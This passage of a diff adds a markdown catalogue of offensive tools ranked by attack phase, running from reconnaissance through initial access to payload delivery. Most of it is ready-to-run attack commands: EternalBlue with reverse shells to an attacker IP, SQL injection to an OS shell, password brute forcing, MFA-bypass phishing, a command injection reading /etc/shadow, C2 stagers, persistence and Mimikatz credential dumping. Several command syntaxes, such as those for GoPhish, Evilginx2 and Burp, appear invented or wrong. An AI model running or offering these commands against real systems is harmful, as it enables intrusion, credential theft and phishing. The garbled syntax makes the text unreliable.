+nuclei -u <URL> -timeout 10 -o /opt/sec/output/nuclei_timeout_<TIMESTAMP>.txt
+
+# 9. Filter by tags
+nuclei -u <URL> -tags cve,wordpress -o /opt/sec/output/nuclei_tags_<TIMESTAMP>.txt
+
+# 10. Silent mode (no output except findings)
+nuclei -u <URL> -silent -o /opt/sec/output/nuclei_silent_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. ASNMap
+**Description:** ASN mapping and IP range discovery tool.
+
+**Why Best:** Identifies IP ranges belonging to organizations for targeting.
+
+**Mods (Commands):**
+```bash
+# 1. Query ASN for domain
+asnmap -d <DOMAIN> -o /opt/sec/output/asnmap_domain_<TIMESTAMP>.txt
+
+# 2. Query ASN for IP
+asnmap -ip <IP_ADDRESS> -o /opt/sec/output/asnmap_ip_<TIMESTAMP>.txt
+
+# 3. Query ASN for ASN number
+asnmap -asn <ASN_NUMBER> -o /opt/sec/output/asnmap_asn_<TIMESTAMP>.txt
+
+# 4. JSON output
+asnmap -d <DOMAIN> -json -o /opt/sec/output/asnmap_json_<TIMESTAMP>.json
+
+# 5. Get CIDR ranges only
+asnmap -d <DOMAIN> -o /opt/sec/output/asnmap_cidr_<TIMESTAMP>.txt | grep -v "ASN" | awk '{print $NF}'
+
+# 6. Query multiple domains
+asnmap -l /opt/sec/inputs/<DOMAIN_LIST> -o /opt/sec/output/asnmap_multi_<TIMESTAMP>.txt
+
+# 7. Verbose output
+asnmap -d <DOMAIN> -v -o /opt/sec/output/asnmap_verbose_<TIMESTAMP>.txt
+
+# 8. Use specific resolver
+asnmap -d <DOMAIN> -r <RESOLVER> -o /opt/sec/output/asnmap_resolver_<TIMESTAMP>.txt
+
+# 9. Get organization info
+asnmap -d <DOMAIN> -org -o /opt/sec/output/asnmap_org_<TIMESTAMP>.txt
+
+# 10. Get country info
+asnmap -d <DOMAIN> -country -o /opt/sec/output/asnmap_country_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. Cloudlist
+**Description:** Cloud provider asset discovery tool.
+
+**Why Best:** Discovers assets across AWS, Azure, GCP, and other cloud providers.
+
+**Mods (Commands):**
+```bash
+# 1. List cloud assets (all providers)
+cloudlist -o /opt/sec/output/cloudlist_all_<TIMESTAMP>.txt
+
+# 2. AWS only
+cloudlist -provider aws -o /opt/sec/output/cloudlist_aws_<TIMESTAMP>.txt
+
+# 3. Azure only
+cloudlist -provider azure -o /opt/sec/output/cloudlist_azure_<TIMESTAMP>.txt
+
+# 4. GCP only
+cloudlist -provider gcp -o /opt/sec/output/cloudlist_gcp_<TIMESTAMP>.txt
+
+# 5. JSON output
+cloudlist -json -o /opt/sec/output/cloudlist_json_<TIMESTAMP>.json
+
+# 6. Use specific credentials file
+cloudlist -config /opt/sec/configs/cloudlist_config.yaml -o /opt/sec/output/cloudlist_config_<TIMESTAMP>.txt
+
+# 7. Verbose output
+cloudlist -v -o /opt/sec/output/cloudlist_verbose_<TIMESTAMP>.txt
+
+# 8. Silent mode
+cloudlist -silent -o /opt/sec/output/cloudlist_silent_<TIMESTAMP>.txt
+
+# 9. Include public IPs
+cloudlist -public -o /opt/sec/output/cloudlist_public_<TIMESTAMP>.txt
+
+# 10. Filter by region
+cloudlist -region <REGION> -o /opt/sec/output/cloudlist_region_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. WhatWeb (Extended)
+**Description:** Web technology fingerprinting and detection.
+
+**Why Best:** Quick identification of web technologies and versions.
+
+**Mods (Commands):**
+```bash
+# 1. Basic fingerprint
+whatweb <URL> --log-json=/opt/sec/output/whatweb_map_<TIMESTAMP>.json
+
+# 2. Aggressive scan (level 3)
+whatweb <URL> -a 3 --log-json=/opt/sec/output/whatweb_aggressive_map_<TIMESTAMP>.json
+
+# 3. Scan with user-agent
+whatweb <URL> -u "Mozilla/5.0" --log-json=/opt/sec/output/whatweb_ua_map_<TIMESTAMP>.json
+
+# 4. XML output
+whatweb <URL> --log-xml=/opt/sec/output/whatweb_xml_map_<TIMESTAMP>.xml
+
+# 5. CSV output
+whatweb <URL> --log-csv=/opt/sec/output/whatweb_csv_map_<TIMESTAMP>.csv
+
+# 6. Scan multiple hosts
+whatweb -i /opt/sec/inputs/<HOST_LIST> --log-json=/opt/sec/output/whatweb_multi_map_<TIMESTAMP>.json
+
+# 7. Verbose output
+whatweb <URL> -v --log-json=/opt/sec/output/whatweb_verbose_map_<TIMESTAMP>.json
+
+# 8. Custom headers
+whatweb <URL> -H "X-Custom-Header: value" --log-json=/opt/sec/output/whatweb_header_map_<TIMESTAMP>.json
+
+# 9. Follow redirects
+whatweb <URL> -f --log-json=/opt/sec/output/whatweb_redirect_map_<TIMESTAMP>.json
+
+# 10. No errors (quiet)
+whatweb <URL> -no-errors --log-json=/opt/sec/output/whatweb_quiet_map_<TIMESTAMP>.json
+```
+
+---
+
+## PHASE 3: INITIAL ACCESS (★★★★★)
+
+**Description:** Gaining first foothold in the target environment through exploitation or social engineering.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. Metasploit Framework
+**Description:** Platform for developing, testing, and executing exploits against targets.
+
+**Why Best:** Most comprehensive framework for exploitation with vast library of exploits, payloads, and auxiliary modules.
+
+**Mods (Commands):**
+```bash
+# 1. Use EternalBlue exploit
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET_IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <PORT>; run -j" > /opt/sec/output/msf_eternal_<TIMESTAMP>.txt
+
+# 2. Use web exploit
+msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; set RHOSTS <TARGET_IP>; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; run -j" > /opt/sec/output/msf_struts_<TIMESTAMP>.txt
+
+# 3. Search for specific exploit
+msfconsole -q -x "search type:exploit name:apache; exit" > /opt/sec/output/msf_search_<TIMESTAMP>.txt
+
+# 4. Auxiliary scanner
+msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS <IP_RANGE>; set PORTS <PORT_RANGE>; run; exit" > /opt/sec/output/msf_scanner_<TIMESTAMP>.txt
+
+# 5. Multi handler for payload
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <PORT>; exploit -j" > /opt/sec/output/msf_handler_<TIMESTAMP>.txt
+
+# 6. Show payloads for module
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; show payloads; exit" > /opt/sec/output/msf_payloads_<TIMESTAMP>.txt
+
+# 7. Set global variable for multiple exploits
+msfconsole -q -x "setg RHOSTS <TARGET_IP>; use exploit/windows/smb/ms17_010_eternalblue; show options; exit" > /opt/sec/output/msf_global_<TIMESTAMP>.txt
+
+# 8. Verbose exploit
+msfconsole -q -x "set VERBOSE true; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET_IP>; run; exit" > /opt/sec/output/msf_verbose_<TIMESTAMP>.txt
+
+# 9. HTTPS payload
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <ATTACKER_IP>; set LPORT <PORT>; exploit -j" > /opt/sec/output/msf_https_<TIMESTAMP>.txt
+
+# 10. Run with resource script
+msfconsole -q -r /opt/sec/scripts/msf_<SCRIPT>.rc > /opt/sec/output/msf_script_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. SQLmap
+**Description:** Automates detection and exploitation of SQL injection vulnerabilities.
+
+**Why Best:** Definitive tool for SQL injection with database takeover capabilities.
+
+**Mods (Commands):**
+```bash
+# 1. Enumerate databases
+sqlmap -u "<URL>?id=1" --batch --dbs --output-dir=/opt/sec/output/sqlmap_db_<TIMESTAMP>
+
+# 2. Enumerate tables
+sqlmap -u "<URL>?id=1" -D <DB_NAME> --tables --output-dir=/opt/sec/output/sqlmap_tables_<TIMESTAMP>
+
+# 3. Enumerate columns
+sqlmap -u "<URL>?id=1" -D <DB_NAME> -T <TABLE_NAME> --columns --output-dir=/opt/sec/output/sqlmap_columns_<TIMESTAMP>
+
+# 4. Dump table data
+sqlmap -u "<URL>?id=1" -D <DB_NAME> -T <TABLE_NAME> --dump --output-dir=/opt/sec/output/sqlmap_dump_<TIMESTAMP>
+
+# 5. Attempt OS shell
+sqlmap -u "<URL>?id=1" --os-shell --output-dir=/opt/sec/output/sqlmap_shell_<TIMESTAMP>
+
+# 6. Get OOB interactive shell
+sqlmap -u "<URL>?id=1" --os-pwn --output-dir=/opt/sec/output/sqlmap_pwn_<TIMESTAMP>
+
+# 7. Use cookie for authentication
+sqlmap -u "<URL>?id=1" --cookie="<COOKIE_STRING>" --output-dir=/opt/sec/output/sqlmap_cookie_<TIMESTAMP>
+
+# 8. Increase test level and risk
+sqlmap -u "<URL>?id=1" --level=3 --risk=2 --output-dir=/opt/sec/output/sqlmap_risk_<TIMESTAMP>
+
+# 9. Load request from Burp file
+sqlmap -r /opt/sec/inputs/<REQUEST_FILE>.txt --output-dir=/opt/sec/output/sqlmap_request_<TIMESTAMP>
+
+# 10. Set threads for speed
+sqlmap -u "<URL>?id=1" --threads=10 --output-dir=/opt/sec/output/sqlmap_threads_<TIMESTAMP>
+```
+
+---
+
+#### 3. Hydra
+**Description:** Fast password-cracking tool for various services.
+
+**Why Best:** Most common and effective tool for password spraying attacks with wide protocol support.
+
+**Mods (Commands):**
+```bash
+# 1. SSH brute-force
+hydra -l <USERNAME> -P /opt/sec/wordlists/passwords.txt <TARGET_IP> ssh -o /opt/sec/output/hydra_ssh_<TIMESTAMP>.txt
+
+# 2. FTP brute-force
+hydra -L /opt/sec/wordlists/usernames.txt -p <PASSWORD> <TARGET_IP> ftp -o /opt/sec/output/hydra_ftp_<TIMESTAMP>.txt
+
+# 3. HTTP form brute-force
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -o /opt/sec/output/hydra_http_<TIMESTAMP>.txt
+
+# 4. SMB brute-force
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> smb -o /opt/sec/output/hydra_smb_<TIMESTAMP>.txt
+
+# 5. RDP brute-force
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> rdp -o /opt/sec/output/hydra_rdp_<TIMESTAMP>.txt
+
+# 6. MySQL brute-force
+hydra -l <USERNAME> -P /opt/sec/wordlists/passwords.txt <TARGET_IP> mysql -o /opt/sec/output/hydra_mysql_<TIMESTAMP>.txt
+
+# 7. POP3 brute-force
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> pop3 -o /opt/sec/output/hydra_pop3_<TIMESTAMP>.txt
+
+# 8. Use credential list (user:pass)
+hydra -C /opt/sec/inputs/<CRED_LIST_FILE> <TARGET_IP> ssh -o /opt/sec/output/hydra_cred_<TIMESTAMP>.txt
+
+# 9. HTTPS form brute-force
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt <TARGET_IP> https-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -o /opt/sec/output/hydra_https_<TIMESTAMP>.txt
+
+# 10. Try null, same as user, and reverse
+hydra -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt -e nsr <TARGET_IP> smb -o /opt/sec/output/hydra_null_<TIMESTAMP>.txt
+```
+
+---
+
+#### 4. Ncrack
+**Description:** High-performance network authentication cracking tool.
+
+**Why Best:** More robust and faster than Hydra for large-scale password auditing.
+
+**Mods (Commands):**
+```bash
+# 1. SSH brute-force
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt ssh://<TARGET_IP> -o /opt/sec/output/ncrack_ssh_<TIMESTAMP>.txt
+
+# 2. FTP brute-force
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt ftp://<TARGET_IP> -o /opt/sec/output/ncrack_ftp_<TIMESTAMP>.txt
+
+# 3. RDP brute-force
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt rdp://<TARGET_IP> -o /opt/sec/output/ncrack_rdp_<TIMESTAMP>.txt
+
+# 4. SMB brute-force
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt smb://<TARGET_IP> -o /opt/sec/output/ncrack_smb_<TIMESTAMP>.txt
+
+# 5. MySQL brute-force
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt mysql://<TARGET_IP> -o /opt/sec/output/ncrack_mysql_<TIMESTAMP>.txt
+
+# 6. VNC brute-force
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt vnc://<TARGET_IP> -o /opt/sec/output/ncrack_vnc_<TIMESTAMP>.txt
+
+# 7. Parallel connections
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt --parallel 5 http://<TARGET_IP> -o /opt/sec/output/ncrack_parallel_<TIMESTAMP>.txt
+
+# 8. Specify port
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt -p <PORT> ssh://<TARGET_IP> -o /opt/sec/output/ncrack_port_<TIMESTAMP>.txt
+
+# 9. Debug mode
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt ssh://<TARGET_IP> -d -o /opt/sec/output/ncrack_debug_<TIMESTAMP>.txt
+
+# 10. Save output
+ncrack -U /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt ssh://<TARGET_IP> -oN /opt/sec/output/ncrack_output_<TIMESTAMP>.txt
+```
+
+---
+
+#### 5. Evilginx2
+**Description:** Adversary-in-the-middle phishing framework for capturing MFA sessions.
+
+**Why Best:** Modern tool for bypassing MFA through real-time credential proxying.
+
+**Mods (Commands):**
+```bash
+# 1. Start Evilginx2 with config
+evilginx -config /opt/sec/configs/evilginx_config.yaml > /opt/sec/output/evilginx_start_<TIMESTAMP>.txt
+
+# 2. Create phishlet from template
+evilginx -create <PHISHLET_NAME> -template <TEMPLATE> -o /opt/sec/output/evilginx_create_<TIMESTAMP>.txt
+
+# 3. List available phishlets
+evilginx -list > /opt/sec/output/evilginx_list_<TIMESTAMP>.txt
+
+# 4. Enable phishlet
+evilginx -enable <PHISHLET_NAME> -o /opt/sec/output/evilginx_enable_<TIMESTAMP>.txt
+
+# 5. Get phishing URL
+evilginx -url <PHISHLET_NAME> > /opt/sec/output/evilginx_url_<TIMESTAMP>.txt
+
+# 6. View captured credentials
+evilginx -view > /opt/sec/output/evilginx_creds_<TIMESTAMP>.txt
+
+# 7. Export captured data
+evilginx -export /opt/sec/output/evilginx_export_<TIMESTAMP>.csv
+
+# 8. Clear captured data
+evilginx -clear > /opt/sec/output/evilginx_clear_<TIMESTAMP>.txt
+
+# 9. Show status
+evilginx -status > /opt/sec/output/evilginx_status_<TIMESTAMP>.txt
+
+# 10. Debug mode
+evilginx -debug -config /opt/sec/configs/evilginx_config.yaml > /opt/sec/output/evilginx_debug_<TIMESTAMP>.txt
+```
+
+---
+
+#### 6. GoPhish
+**Description:** Open-source phishing campaign manager.
+
+**Why Best:** Comprehensive phishing platform with campaign management and reporting.
+
+**Mods (Commands):**
+```bash
+# 1. Start GoPhish server
+gophish -config /opt/sec/configs/gophish_config.json > /opt/sec/output/gophish_start_<TIMESTAMP>.txt
+
+# 2. Import campaign
+gophish -import /opt/sec/inputs/<CAMPAIGN_FILE>.json > /opt/sec/output/gophish_import_<TIMESTAMP>.txt
+
+# 3. List campaigns
+gophish -list > /opt/sec/output/gophish_list_<TIMESTAMP>.txt
+
+# 4. Export campaign results
+gophish -export <CAMPAIGN_ID> -o /opt/sec/output/gophish_export_<TIMESTAMP>.csv
+
+# 5. Create template
+gophish -create template -name <TEMPLATE_NAME> -file /opt/sec/inputs/<EMAIL_TEMPLATE>.html > /opt/sec/output/gophish_template_<TIMESTAMP>.txt
+
+# 6. Create sending profile
+gophish -create profile -name <PROFILE_NAME> -smtp <SMTP_SERVER> -port <PORT> -username <USER> -password <PASS> > /opt/sec/output/gophish_profile_<TIMESTAMP>.txt
+
+# 7. Create landing page
+gophish -create landing -name <LANDING_NAME> -url <URL> -o /opt/sec/output/gophish_landing_<TIMESTAMP>.txt
+
+# 8. Launch campaign
+gophish -launch <CAMPAIGN_NAME> -o /opt/sec/output/gophish_launch_<TIMESTAMP>.txt
+
+# 9. Stop campaign
+gophish -stop <CAMPAIGN_ID> > /opt/sec/output/gophish_stop_<TIMESTAMP>.txt
+
+# 10. Show stats
+gophish -stats > /opt/sec/output/gophish_stats_<TIMESTAMP>.txt
+```
+
+---
+
+#### 7. BeEF
+**Description:** Browser exploitation framework focusing on web browsers.
+
+**Why Best:** Unique focus on browser exploitation and pivoting.
+
+**Mods (Commands):**
+```bash
+# 1. Start BeEF server
+beef-xss --config /opt/sec/configs/beef.yaml > /opt/sec/output/beef_start_<TIMESTAMP>.txt
+
+# 2. Start with custom config
+beef --config /opt/sec/configs/beef_custom.yaml > /opt/sec/output/beef_custom_<TIMESTAMP>.txt
+
+# 3. Verbose mode
+beef --verbose --config /opt/sec/configs/beef.yaml > /opt/sec/output/beef_verbose_<TIMESTAMP>.txt
+
+# 4. Enable REST API
+beef --rest-api --config /opt/sec/configs/beef.yaml > /opt/sec/output/beef_rest_<TIMESTAMP>.txt
+
+# 5. Debug mode
+beef --debug --config /opt/sec/configs/beef.yaml > /opt/sec/output/beef_debug_<TIMESTAMP>.txt
+
+# 6. Get hook.js URL
+beef --hook-url --config /opt/sec/configs/beef.yaml > /opt/sec/output/beef_hook_<TIMESTAMP>.txt
+
+# 7. List modules
+beef --list-modules --config /opt/sec/configs/beef.yaml > /opt/sec/output/beef_modules_<TIMESTAMP>.txt
+
+# 8. Update BeEF
+beef --update > /opt/sec/output/beef_update_<TIMESTAMP>.txt
+
+# 9. Show version
+beef --version > /opt/sec/output/beef_version_<TIMESTAMP>.txt
+
+# 10. Show help
+beef --help > /opt/sec/output/beef_help_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. Proxychains
+**Description:** Forces any TCP connection through a proxy chain.
+
+**Why Best:** Invaluable for chaining exploits through proxies to maintain anonymity and route traffic.
+
+**Mods (Commands):**
+```bash
+# 1. Run Nmap through proxy
+proxychains nmap -sT -Pn <TARGET_IP> -o /opt/sec/output/proxychains_nmap_<TIMESTAMP>.txt
+
+# 2. Run SQLmap through proxy
+proxychains sqlmap -u "<URL>" --batch --output-dir=/opt/sec/output/proxychains_sqlmap_<TIMESTAMP>
+
+# 3. Run Hydra through proxy
+proxychains hydra <TARGET_IP> ssh -L /opt/sec/wordlists/usernames.txt -P /opt/sec/wordlists/passwords.txt -o /opt/sec/output/proxychains_hydra_<TIMESTAMP>.txt
+
+# 4. Run Metasploit through proxy
+proxychains msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET_IP>; run" > /opt/sec/output/proxychains_msf_<TIMESTAMP>.txt
+
+# 5. Custom config file
+proxychains -f /opt/sec/configs/proxychains.conf nmap -sT -Pn <TARGET_IP> > /opt/sec/output/proxychains_custom_<TIMESTAMP>.txt
+
+# 6. SSH through proxy
+proxychains ssh <USER>@<TARGET_IP> > /opt/sec/output/proxychains_ssh_<TIMESTAMP>.txt
+
+# 7. Netcat through proxy
+proxychains nc -nvv <TARGET_IP> <PORT> > /opt/sec/output/proxychains_nc_<TIMESTAMP>.txt
+
+# 8. cURL through proxy
+proxychains curl <URL> > /opt/sec/output/proxychains_curl_<TIMESTAMP>.txt
+
+# 9. FireFox through proxy (for manual browsing)
+proxychains firefox > /opt/sec/output/proxychains_firefox_<TIMESTAMP>.txt 2>&1
+
+# 10. wget through proxy
+proxychains wget <URL> -O /opt/sec/output/proxychains_wget_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. Payload Playground
+**Description:** Comprehensive CLI toolkit with 51 commands for payload generation and pentesting.
+
+**Why Best:** Zero dependencies, pipe-friendly, TTY-aware output for every phase of a pentest.
+
+**Mods (Commands):**
+```bash
+# 1. Generate XSS payloads
+payload xss -t svg --encoding url -o /opt/sec/output/payload_xss_<TIMESTAMP>.txt
+
+# 2. Generate SQL injection payloads
+payload sqli -d MySQL -g detect-time -o /opt/sec/output/payload_sqli_<TIMESTAMP>.txt
+
+# 3. Generate command injection
+payload cmdi -c "cat /etc/shadow" -b ifs -s '$()' -o /opt/sec/output/payload_cmdi_<TIMESTAMP>.txt
+
+# 4. Generate fuzzing wordlist
+payload fuzz -c sqli > /opt/sec/output/payload_fuzz_<TIMESTAMP>.txt
+
+# 5. Generate reverse shell
+payload revshell -i <ATTACKER_IP> -p <PORT> -s python3 -l nc --stabilize python-pty -o /opt/sec/output/payload_revshell_<TIMESTAMP>.txt
+
+# 6. Generate password wordlist
+payload password -l 8 --no-symbols -c 100 > /opt/sec/output/payload_passwords_<TIMESTAMP>.txt
+
+# 7. Encode payload
+payload encode -t url "<PAYLOAD>" > /opt/sec/output/payload_encode_<TIMESTAMP>.txt
+
+# 8. JWT decode and attack
+payload jwt-decode "<JWT_TOKEN>" > /opt/sec/output/payload_jwt_<TIMESTAMP>.txt
+
+# 9. WAF bypass generation
+payload waf-bypass -c xss -t unicode -o /opt/sec/output/payload_waf_<TIMESTAMP>.txt
+
+# 10. Deobfuscate JavaScript
+payload deobfuscate 'eval(atob("YWxlcnQoMSk="))' > /opt/sec/output/payload_deobfuscate_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. Burp Suite (CLI)
+**Description:** Integrated platform for web application security testing.
+
+**Why Best:** Essential for manual web application testing with powerful automation.
+
+**Mods (Commands):**
+```bash
+# 1. Headless scan
+burpsuite --headless --scan <URL> > /opt/sec/output/burp_scan_<TIMESTAMP>.txt
+
+# 2. Scan from list
+burpsuite --headless --scan --url-list /opt/sec/inputs/<URL_LIST> > /opt/sec/output/burp_list_<TIMESTAMP>.txt
+
+# 3. Export CA certificate
+burpsuite --export --certificate /opt/sec/output/burp_cert_<TIMESTAMP>.crt
+
+# 4. Use project file
+burpsuite --headless --project-file /opt/sec/projects/<PROJECT_FILE> --scan <URL> > /opt/sec/output/burp_project_<TIMESTAMP>.txt
+
+# 5. Use config file
+burpsuite --headless --config-file /opt/sec/configs/burp_config.json --scan <URL> > /opt/sec/output/burp_config_<TIMESTAMP>.txt
+
+# 6. Scan with scope
+burpsuite --headless --scan --scope <SCOPE_DEFINITION> <URL> > /opt/sec/output/burp_scope_<TIMESTAMP>.txt
+
+# 7. Upload file
+burpsuite --upload --file /opt/sec/inputs/<FILE> > /opt/sec/output/burp_upload_<TIMESTAMP>.txt
+
+# 8. Import CA certificate
+burpsuite --import --ca-certificate /opt/sec/inputs/<CERT_FILE> > /opt/sec/output/burp_import_<TIMESTAMP>.txt
+
+# 9. Stop on error
+burpsuite --headless --scan --stop-on-error <URL> > /opt/sec/output/burp_stop_<TIMESTAMP>.txt
+
+# 10. Show version
+burpsuite --version > /opt/sec/output/burp_version_<TIMESTAMP>.txt
+```
+
+---
+
+## PHASE 4: PAYLOAD DELIVERY (★★★★★)
+
+**Description:** Delivering malicious payload to target system after initial access.
+
+### Ranked Tools (1-10)
+
+---
+
+#### 1. Empire
+**Description:** Post-exploitation framework using PowerShell and Python agents.
+
+**Why Best:** Extremely effective for Windows-based payload delivery and C2 with stealthy communication.
+
+**Mods (Commands):**
+```bash
+# 1. Start Empire server
+empire --config /opt/sec/configs/empire.yaml > /opt/sec/output/empire_start_<TIMESTAMP>.txt
+
+# 2. Use HTTP listener
+empire --command "uselistener http; set Name <LISTENER_NAME>; set Host <ATTACKER_IP>; set Port <PORT>; execute; exit" > /opt/sec/output/empire_listener_<TIMESTAMP>.txt
+
+# 3. Generate launcher (batch)
+empire --command "usestager windows/launcher_bat; set Listener <LISTENER_NAME>; execute; exit" > /opt/sec/output/empire_stager_<TIMESTAMP>.txt
+
+# 4. Generate PowerShell launcher
+empire --command "usestager windows/launcher_ps1; set Listener <LISTENER_NAME>; execute; exit" > /opt/sec/output/empire_ps1_<TIMESTAMP>.txt
+
+# 5. Generate macro stager
+empire --command "usestager windows/macro; set Listener <LISTENER_NAME>; execute; exit" > /opt/sec/output/empire_macro_<TIMESTAMP>.txt
+
+# 6. Use persistence module
+empire --command "usemodule persistence/elevated/install_sshin; set TaskName <TASK_NAME>; execute; exit" > /opt/sec/output/empire_persist_<TIMESTAMP>.txt
+
+# 7. Show active agents
+empire --command "agents; exit" > /opt/sec/output/empire_agents_<TIMESTAMP>.txt
+
+# 8. Interact with agent
+empire --command "interact <AGENT_NAME>; whoami; exit" > /opt/sec/output/empire_interact_<TIMESTAMP>.txt
+
+# 9. Use Mimikatz module
+empire --command "usemodule powershell/management/mimikatz; execute; exit" > /opt/sec/output/empire_mimikatz_<TIMESTAMP>.txt
+
+# 10. Take screenshot
+empire --command "usemodule powershell/management/screenshot; execute; exit" > /opt/sec/output/empire_screenshot_<TIMESTAMP>.txt
+```
+
+---
+
+#### 2. Cobalt Strike
+**Description:** Commercial C2 and post-exploitation tool.
+
+**Why Best:** Industry standard for advanced red team operations with robust payload delivery.
+
+**Mods (Commands):**
+```bash
+# 1. Start team server
+./teamserver <ATTACKER_IP> <PASSWORD> > /opt/sec/output/cobalt_server_<TIMESTAMP>.txt
+
+# 2. Launch Aggressor script
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -script /opt/sec/scripts/cobalt_<SCRIPT>.cna > /opt/sec/output/cobalt_aggressor_<TIMESTAMP>.txt
+
+# 3. Manage listeners
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -command "listeners" > /opt/sec/output/cobalt_listeners_<TIMESTAMP>.txt
+
+# 4. Generate payload
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -command "launcher" > /opt/sec/output/cobalt_launcher_<TIMESTAMP>.txt
+
+# 5. Execute command on beacon
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -command "execute whoami" > /opt/sec/output/cobalt_execute_<TIMESTAMP>.txt
+
+# 6. Jump to system
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -command "jump psexec <TARGET_IP>" > /opt/sec/output/cobalt_jump_<TIMESTAMP>.txt
+
+# 7. Download file
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -command "download <FILE>" > /opt/sec/output/cobalt_download_<TIMESTAMP>.txt
+
+# 8. Upload file
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -command "upload <FILE>" > /opt/sec/output/cobalt_upload_<TIMESTAMP>.txt
+
+# 9. Take screenshot
+./aggressor -host <HOST> -port <PORT> -user <USER> -password <PASSWORD> -command "screenshot" > /opt/sec/output/cobalt_screen_<TIMESTAMP>.txt
+
+# 10. Show help
+./aggressor -help > /opt/sec/output/cobalt_help_<TIMESTAMP>.txt
+```
+
+---
+
+#### 3. Meterpreter
+**Description:** Advanced, dynamically extensible payload from Metasploit.
+
+**Why Best:** Feature-rich, versatile payload providing powerful interactive shell.
+
+**Mods (Commands):**
+```bash
+# 1. Upload file
+meterpreter > upload /opt/sec/inputs/<LOCAL_FILE> <REMOTE_FILE> > /opt/sec/output/meterpreter_upload_<TIMESTAMP>.txt
+
+# 2. Download file
+meterpreter > download <REMOTE_FILE> /opt/sec/output/meterpreter_download_<TIMESTAMP> > /opt/sec/output/meterpreter_download_log_<TIMESTAMP>.txt
+
+# 3. Execute command in hidden window
+meterpreter > execute -f <COMMAND> -c > /opt/sec/output/meterpreter_exec_<TIMESTAMP>.txt
+
+# 4. Attempt SYSTEM privileges
+meterpreter > getsystem > /opt/sec/output/meterpreter_system_<TIMESTAMP>.txt
+
+# 5. Spawn native shell
+meterpreter > shell > /opt/sec/output/meterpreter_shell_<TIMESTAMP>.txt
+
+# 6. Migrate to another process
+meterpreter > migrate <PID> > /opt/sec/output/meterpreter_migrate_<TIMESTAMP>.txt
+
+# 7. List processes
+meterpreter > ps > /opt/sec/output/meterpreter_ps_<TIMESTAMP>.txt
+
+# 8. Launch VNC session
+meterpreter > run vnc > /opt/sec/output/meterpreter_vnc_<TIMESTAMP>.txt
+
+# 9. Background session
+meterpreter > background > /opt/sec/output/meterpreter_background_<TIMESTAMP>.txt
+
+# 10. Screenshot
+meterpreter > screenshot -o /opt/sec/output/meterpreter_screen_<TIMESTAMP>.png > /opt/sec/output/meterpreter_screen_log_<TIMESTAMP>.txt
+```
+
+---
+
+#### 4. PowerSploit
+**Description:** Collection of PowerShell modules for post-exploitation.
+
+**Why Best:** Foundational library for PowerShell-based attacks integrated into larger frameworks.
+
+**Mods (Commands):**
+```bash
+# 1. Import module
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; exit" > /opt/sec/output/powersploit_import_<TIMESTAMP>.txt
+
+# 2. Inject shellcode
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost <ATTACKER_IP> -Lport <PORT> -Force" > /opt/sec/output/powersploit_shellcode_<TIMESTAMP>.txt
+
+# 3. Run Mimikatz
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module /opt/sec/tools/PowerSploit/PowerSploit.psd1; Invoke-Mimikatz -DumpCreds" > /opt/sec/output/powersploit_mimikatz_<TIMESTAMP>.txt
+
